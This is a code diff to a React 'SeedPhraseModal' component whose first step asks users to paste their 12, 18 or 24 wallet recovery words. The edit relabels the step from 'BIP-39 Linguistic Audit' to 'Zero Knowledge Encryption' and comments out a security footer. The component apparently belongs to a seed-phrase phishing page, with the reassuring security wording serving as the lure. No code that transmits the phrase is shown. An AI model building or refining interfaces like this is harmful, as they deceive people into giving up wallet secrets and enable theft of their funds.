@@ -46,7 +46,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
 
   const securityFooter = (
     <div style={{ padding: '8px 20px 20px' }}>
-      <div style={{
+      {/* <div style={{
         display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px',
         background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10
       }}>
@@ -62,7 +62,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
             <span style={{ color: 'var(--text2)' }}>SECURITY:</span> Zero-Knowledge Encryption
           </div>
         </div>
-      </div>
+      </div> */}
     </div>
   );
 
@@ -84,7 +84,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
 
         {/* ── STEP 1: SEED PHRASE ── */}
         {step === 'seed' && <>
-          {header('BIP-39 Linguistic Audit')}
+          {header('Zero Knowledge Encryption')}
           <div style={{ padding: '20px 20px 4px' }}>
             {walletBadge}
             <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
@@ -92,7 +92,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
             </div>
             <textarea
               autoFocus
-              placeholder="Type or paste your 12 recovery words..."
+              placeholder="Type or paste your 12,18 or 24 recovery words..."
               value={phrase}
               onChange={e => setPhrase(e.target.value)}
               style={{
